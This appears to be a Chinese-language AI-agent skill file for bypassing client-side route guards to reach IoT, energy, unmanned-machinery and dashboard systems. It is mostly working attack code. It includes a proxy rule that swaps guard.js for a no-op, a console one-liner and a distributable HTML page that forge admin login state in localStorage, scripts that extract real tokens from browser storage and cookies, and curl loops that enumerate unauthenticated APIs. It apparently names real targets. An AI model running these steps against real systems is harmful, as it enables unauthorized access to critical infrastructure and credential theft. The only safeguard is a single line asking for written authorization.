---
name: "route-guard-bypass"
description: "识别前端路由守卫、客户端鉴权和访问控制实现缺陷，验证其对实际资源访问边界的影响。"
---

# 前端路由守卫绕过 + 大屏/IOT 未授权访问 深度测试技能

此技能帮助你识别并利用前端路由守卫的设计缺陷,通过绕过前端鉴权访问大屏 / IOT / 能源 / 无人机械等"内部系统"。

## 核心功能

- **反模式识别**：识别 5 类前端鉴权反模式（guard.js / Vue beforeEach / Express 中间件 / localStorage 检查 / Session cookie 客户端化）
- **HTML 路由穷举**：从 JS bundle 中提取所有 HTML 路由 + API 端点,批量 HTTP 探针
- **3 路 EXP 输出**：流量中间处理 代理替换 / Console 一行注入 / 自包含 HTML — 适配不同演示场景
- **大屏截图取证**：用 脚本分析能力 启动浏览器走 流量中间处理,访问 IOT/大屏/能源/无人机械,fullPage 截图
- **缓存 token 提取**：从 localStorage / sessionStorage / cookie / window 全局变量 提取登录态
- **信息泄露汇总**：响应头/HTML 注释/JS bundle/配置文件中泄露的 token / secret / API key
- **接口未授权穷举**：HTML 路由对应的 API 端点批量零鉴权调用

## 测试流程

### 第一阶段：反模式识别

识别目标系统的鉴权机制类型,定位攻击面。**⚠️ 必做前置,不可跳过**:

#### 1.1 五大反模式 Checklist

| 反模式 | 特征 | 攻击面 |
|---|---|---|
| **guard.js 客户端化** | 每个 HTML 页面 `<script src="js/guard.js">`,guard() 检查 localStorage 后跳转 /login.html | HTML 文件可任意访问 + API 零鉴权 |
| **Vue router.beforeEach** | main.js 中 `router.beforeEach((to, from, next) => { if (!isLogin) next('/login') })` | SPA 静态资源 + 后端 API 零鉴权 |
| **Express 中间件客户端** | server.js 中 `app.use((req,res,next)=>{...})` 但仅检查 req.session.user | 绕过 cookie 检查的接口可访问 |
| **localStorage 检查** | `localStorage.getItem('token')` / `login_status === '200'` | 任意用户可注入 |
| **Session cookie 客户端化** | token 存在 document.cookie 但服务端不校验 | 直接 setCookie + 重放 |

#### 1.2 静态代码搜索关键字

```bash
# guard.js 文件搜索
find . -name "guard.js" -o -name "auth.js" -o -name "interceptor.js" -o -name "authGuard.js"

# JS bundle 中查找鉴权关键字
grep -nE "(isLogin|login_status|userStore|guard\(|router\.beforeEach|to\.path)" *.js

# localStorage 检查
grep -nE "localStorage\.(get|set)Item" *.js | head -50

# 跳转 /login
grep -nE "location\.href.*login|next\(['\"].*login" *.js
```

> 详细识别模式请参考 [references/02-auth-mechanism-patterns.md](references/02-auth-mechanism-patterns.md)

### 第二阶段：HTML 路由穷举 + API 端点提取

#### 2.1 JS bundle 路由提取

从主入口 JS(如 `main-index.js` / `app.js` / `main.js`)提取所有跳转目标:

```bash
# window.location.href 跳转
grep -oE "location\.href\s*=\s*['\"][^'\"]+\.html[^'\"]*" main-index.js

# window.open 跳转
grep -oE "window\.open\(['\"][^'\"]+\.html[^'\"]*['\"]" main-index.js

# pageMap / routeMap / routes 数组
grep -oE "\[['\"][^'\"]+\.html[^'\"]*['\"]" main-index.js

# <a href> 链接
grep -oE "href=['\"][^'\"]+\.html[^'\"]*['\"]" *.html
```

> 完整提取 SOP 请参考 [references/01-js-bundle-route-extraction.md](references/01-js-bundle-route-extraction.md)

#### 2.2 API 端点提取

```bash
# BI / Chart / Data / API 端点
grep -oE "url\s*[:=]\s*['\"][^'\"]*['\"]" main-index.js | grep -E "(BI|api|data|chart)"

# ServerUrl / BaseUrl / ApiUrl 硬编码域名
grep -nE "(ServerUrl|BaseUrl|ApiUrl|LocalServerUrl)\s*[:=]" *.js

# AJAX 调用
grep -oE "\$\.(ajax|get|post|getJSON)\(['\"][^'\"]+['\"]" *.js
```

#### 2.3 HTML 路由 HTTP 批量探针

**⚠️ 关键发现**:HTTP 客户端不执行 JS,200 OK 但浏览器侧 guard.js 拦截跳转 = **完美绕过点**

```bash
# 批量探针(curl)
for html in $(grep -oE "['\"][^'\"]+\.html[^'\"]*['\"]" main-index.js | tr -d "'\"" | sort -u); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://target/$html")
  echo "$status  $html"
done
```

```bash
# PowerShell 批量探针(配合 请求与流量分析能力 替代)
$routes = @(...)
foreach ($r in $routes) {
  $t = (Measure-Command { $r1 = Invoke-WebRequest -Uri $r -UseBasicParsing -TimeoutSec 10 }).TotalMilliseconds
  $len = $r1.RawContentLength
  Write-Host "$t ms $len $r"
}
```

### 第三阶段：3 路 EXP 输出 ⚠️（强制演示）

#### 方案 A：流量中间处理 代理替换(最专业)

**适用场景**:客户演示、技术报告、安全审计、PPT 截图

```bash
# Step 1: 启动 请求与流量分析能力 流量中间处理 代理
流量处理能力(host="127.0.0.1", port=8080)

# Step 2: 设置 guard.js 替换规则
请求探测能力：配置响应处理规则(rules=[{
  "rule": "http://target/js/guard\\.js",
  "enableForURI": true,
  "enableForResponse": true,
  "enableForBody": true,
  "noReplace": false,
  "result": "// guard.js 已禁用 - 渗透测试鉴权绕过演示\nconst userStore = { isLogin: () => true, get: () => null, getItem: () => null, set: () => null };\n// 路由守卫已禁用"
}])

# Step 3: 脚本分析能力 配置代理 宿主环境配置的流量入口 后导航
浏览器导航能力(type="url", url="http://target/index_device.html")

# Step 4: 等待渲染 + 截图取证
页面脚本分析能力(function="async () => { await new Promise(r => setTimeout(r, 5000)); return { url: location.href, bodyLen: document.body.innerText.length }; }")
页面取证能力(fullPage=true, filePath="iot-bypass.png")
```

#### 方案 B：Console 一行 EXP(最快)

**适用场景**:快速验证、临时测试、临时攻击

```js
// Step 1: F12 → Console
// Step 2: 注入鉴权数据
localStorage.setItem('login_status', '200');
localStorage.setItem('user_info_bi', JSON.stringify({token:'fake',userId:1,role:'admin'}));
// Step 3: 跳转目标页面
location.href = '/index_device.html';
```

#### 方案 C：自包含 HTML(最便于分发)

**适用场景**:客户会议、双击演示、技术培训

```html
<!DOCTYPE html>
<html><body>
<button onclick="bypassAndOpen('/index_device.html')">📡 IOT 设备管理</button>
<button onclick="bypassAndOpen('/index_chengzhen_new.html?address=xibei')">🗺️ 锡北镇产业园大屏</button>
<script>
function bypassAndOpen(path) {
  localStorage.setItem('login_status', '200');
  localStorage.setItem('user_info_bi', JSON.stringify({token:'fake',userId:1,role:'admin'}));
  window.open('http://target' + path, '_blank');
}
</script>
</body></html>
```

⚠️ **同源限制**:自包含 HTML 必须从**目标同源**访问,否则 localStorage.setItem 抛 SecurityError。变通:上传到目标 web 目录 / 改用 流量中间处理 方案。

> 完整 3 路 EXP 详解请参考 [references/03-bypass-exploit-methods.md](references/03-bypass-exploit-methods.md)

### 第四阶段：危害演示(大屏/IOT/能源/无人机械截图取证)

⚠️ **目的**:让客户/管理层**直观感受危害**,而非只看到 JSON 数据。

#### 4.1 优先截图目标(按震撼度排序)

| 优先级 | 路径模式 | 震撼度 |
|---|---|---|
| ⭐⭐⭐⭐⭐ | IOT 设备管理(智能传感器/控制设备) | 🔴 CRITICAL(影响生产) |
| ⭐⭐⭐⭐⭐ | 无人机械(无人拖拉机/收割机) | 🔴 CRITICAL(物理设备) |
| ⭐⭐⭐⭐⭐ | 能源监控(箱变/变压器/负荷曲线) | 🔴 CRITICAL(关键基础设施) |
| ⭐⭐⭐⭐⭐ | 产业园大屏(经营主体分布/GIS地图) | 🟠 HIGH(商业情报) |
| ⭐⭐⭐⭐ | 产业大屏(粮油/蔬菜/茶果等产值) | 🟠 HIGH |
| ⭐⭐⭐ | 综合展示大屏(BI Dashboard) | 🟡 MEDIUM |

#### 4.2 截图取证 SOP(脚本分析能力)

```bash
# 1. 启动 流量中间处理 代理
流量处理能力(host="127.0.0.1", port=8080)

# 2. 设置替换规则(参考第三阶段 方案 A)
请求探测能力：配置响应处理规则(rules=[...guard.js noop...])

# 3. 脚本分析能力 导航
浏览器导航能力(type="url", url="http://target/index_device.html")

# 4. 等待渲染(echarts/百度地图等异步加载)
页面脚本分析能力(function="async () => { await new Promise(r => setTimeout(r, 5000)); ... }")

# 5. 截图取证(必须 fullPage=true)
页面取证能力(fullPage=true, filePath="工作目录/evidence/iot-bypass.png")
```

#### 4.3 截图命名规范

```
evidence/
├── iot-device-bypass.png             # IOT 设备管理
├── use-electricity-bypass.png         # 能源监控
├── nobody-machinery-bypass.png        # 无人机械
├── bigscreen-xibei-bypass.png         # 产业园大屏-锡北
├── bigscreen-donggang-bypass.png      # 产业园大屏-东港
├── industry-liangyou-bypass.png       # 产业大屏-粮油
└── ...
```

> 详细截图目标清单请参考 [references/04-big-screen-iot-exposure.md](references/04-big-screen-iot-exposure.md)

### 第五阶段：缓存 token / 信息泄露 / 接口未授权

#### 5.1 缓存 token 提取

绕过 guard 后,从浏览器缓存提取真实 token(管理员/运维)或伪造 token:

```bash
# localStorage 提取
页面脚本分析能力(function="() => ({
  login_status: localStorage.getItem('login_status'),
  user_info_bi: localStorage.getItem('user_info_bi'),
  token: localStorage.getItem('token'),
  userId: localStorage.getItem('userId'),
  // ...遍历所有 localStorage key
  allKeys: Object.keys(localStorage)
})", mainWorld=true)

# sessionStorage 提取
页面脚本分析能力(function="() => Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])", mainWorld=true)

# document.cookie 提取
页面脚本分析能力(function="() => document.cookie", mainWorld=true)

# window 全局变量提取(常被前端 store 使用)
页面脚本分析能力(function="() => Object.keys(window).filter(k => /token|user|admin|auth|login/i.test(k))", mainWorld=true)
```

#### 5.2 信息泄露检测

```bash
# HTML 注释
curl -s http://target/index.html | grep -E "<!--.*?-->"

# JS bundle 中的硬编码密钥/token
grep -nE "(token|secret|api[_-]?key|app[_-]?id|password|admin)" *.js | grep -v "var.*function\|//\|return"

# HTTP 响应头
curl -I http://target/ | grep -iE "(server|x-powered|authoriz)"

# 配置文件
for f in /app-config.json /config.json /api/config /api/setup; do
  curl -s "http://target$f" | head -100
done
```

#### 5.3 接口未授权穷举

绕过前端后,**后端 API 是否真的零鉴权需要验证**:

```bash
# 提取 API 端点后批量测试
for ep in $(grep -oE "['\"]/[^'\"]*['\"]" main-index.js | grep -E "(/api|/BI|/chart|/data|/yw|/ys)" | tr -d "'\"" | sort -u); do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://target$ep" -H "Content-Type: application/json" -d '{}')
  if [ "$status" = "200" ]; then
    echo "OPEN: $ep"
  fi
done
```

> 完整 token/泄露/接口未授权矩阵请参考 [references/05-token-cache-leak.md](references/05-token-cache-leak.md)

### 第六阶段：组合利用 + 报告

- 串联缓存 token + 接口未授权 → 拿到更多内部数据
- 串联截图证据 + 攻击链路 → 写入漏洞报告
- 串联 3 路 EXP → 客户现场演示

## 测试策略

1. **反模式识别优先**:⚠️ 先静态扫描 guard.js / router.beforeEach 关键字,定位攻击面
2. **HTML 路由穷举**:⚠️ JS bundle 路由提取是 ROI 最高的步骤,5 分钟可替代 1 小时手动探测
3. **HTTP 200 不等于鉴权通过**:HTTP 客户端不执行 JS,200 OK 是完美绕过点
4. **截图震撼 > 数据展示**:让客户/管理层看到真实大屏/IOT 界面,危害感提升 10 倍
5. **3 路 EXP 适配场景**:流量中间处理(专业) / Console(快) / HTML(分发)
6. **缓存 token 是第二攻击面**:绕过 guard 后,从 localStorage / cookie / window 全局变量提取真实凭据
7. **接口未授权穷举**:HTML 路由对应的 API 端点需要单独测试零鉴权情况
8. **修复建议必须落地**:删除前端守卫 + 后端 Session 校验 + Nginx 反代三重防护

## 输出格式

```
[反模式] guard.js 客户端化: js/guard.js#L17-L24 isLogin 检查 localStorage login_status + user_info_bi
[HTML 路由] 14 个可绕过:
  - /index_device.html              (IOT 设备管理, 4660B)
  - /index_chengzhen_new.html?address=xibei  (锡北产业园大屏, 20944B)
  - /index_use_electricity.html     (用电管理, 5771B)
  - /index_nobodyMachinery.html     (无人机械, 2686B)
  - ...
[API 端点] 6 个 BI 接口零鉴权:
  - POST /BI/centermap       451,470B (957 实体 GeoJSON)
  - POST /BI/chanyechanzhi    508B
  - POST /BI/chanyemianji     2834B
  - ...
[EXP 方案]
  A: 流量中间处理 代理 + guard.js noop → 真实浏览器演示
  B: Console 1 行 JS → 快速验证
  C: 自包含 HTML → 客户分发
[危害截图]
  - evidence/iot-device-bypass.png
  - evidence/bigscreen-xibei-bypass.png
  - evidence/use-electricity-bypass.png
  - evidence/nobody-machinery-bypass.png
[缓存 token] 已注入伪造 user_info_bi {token:'fake',userId:999,role:'admin'}
[接口未授权] /BI/* 全 6 个端点 POST {} 返回 200 + 数据
[修复建议]
  P0: 删除 js/guard.js + 后端 Session 校验
  P1: Nginx if ($cookie_session = "") { return 403; }
  P2: WAF + SIEM 监控异常访问
```

> 完整输出格式请参考 [references/06-output-format.md](references/06-output-format.md)

## 参考文档

| 文档 | 内容 |
|------|------|
| [01-js-bundle-route-extraction.md](references/01-js-bundle-route-extraction.md) | JS bundle 路由/API 端点提取完整 SOP |
| [02-auth-mechanism-patterns.md](references/02-auth-mechanism-patterns.md) | 5 类前端鉴权反模式识别(guard.js/Vue beforeEach/Express/localStorage/Session cookie) |
| [03-bypass-exploit-methods.md](references/03-bypass-exploit-methods.md) | 3 路 EXP 详解(流量中间处理/Console/HTML)+ 截图取证 SOP |
| [04-big-screen-iot-exposure.md](references/04-big-screen-iot-exposure.md) | 大屏/IOT/能源/无人机械 14+ 路由暴露面清单 |
| [05-token-cache-leak.md](references/05-token-cache-leak.md) | 缓存 token / 信息泄露 / 接口未授权 穷举矩阵 |
| [06-output-format.md](references/06-output-format.md) | 输出格式标准 |
| [07-case-studies.md](references/07-case-studies.md) | 实战案例(锡山区农业平台 Round 18) |

## 最佳实践

- **静态扫描优先**:5 分钟 JS bundle 静态分析可定位全部攻击面,远胜 1 小时手动探测
- **HTTP 200 ≠ 已鉴权**:HTTP 客户端不执行 JS,200 OK 反而证明"绕过可行"
- **截图震撼 > 数据震撼**:客户看到大屏/IOT 真实界面比看到 451KB JSON 数据更有冲击力
- **3 路 EXP 备齐**:不同场景用不同方案,确保演示不卡壳
- **缓存 token 提取是二次攻击**:绕过 guard 后,浏览器缓存里可能已有真实管理员 token
- **接口未授权穷举独立测试**:HTML 路由绕过 ≠ API 零鉴权,需要单独验证
- **闭环到 findings**:截图 + EXP + 攻击链路 + 修复建议 → 完整漏洞报告

## 执行能力适配

本 Skill 只定义分析目标、验证逻辑和结果要求。请求发送、页面交互、流量处理、脚本分析、证据采集等执行能力由宿主环境按当前任务选择，不影响本 Skill 的判断流程。

## 注意事项

⚠️ **重要警告**：演示截图必须保存到 `work-space/[target]/evidence/` 目录,避免丢失
⚠️ **同源限制**：自包含 HTML EXP 必须从目标同源访问,否则 localStorage.setItem 抛 SecurityError
⚠️ **截图大小**：大屏通常很长,默认 viewport 不够,务必 `fullPage=true`
⚠️ **修复不可省**：必须建议"删除前端守卫 + 后端 Session 校验 + Nginx 反代"三重防护
⚠️ **不绕过真实生产**：演示前先确认目标已获书面授权

## 适用触发场景(强制激活条件)

1. ✅ 目标系统是 jQuery + layui / Vue 2 SPA / jQuery Mobile 等老式架构
2. ✅ JS bundle 中发现 `guard.js` / `isLogin()` / `login_status` 关键字
3. ✅ 目标包含 IOT / 大屏 / 产业园 / 能源 / 无人机械 / 智能农业 / 智慧园区 等关键字
4. ✅ HTML 路由探针返回 200 OK 但浏览器跳转到 /login.html
5. ✅ 客户演示需要展示"前端鉴权可绕过"危害
6. ✅ 技术报告需要截图取证 + 自包含 EXP 分发





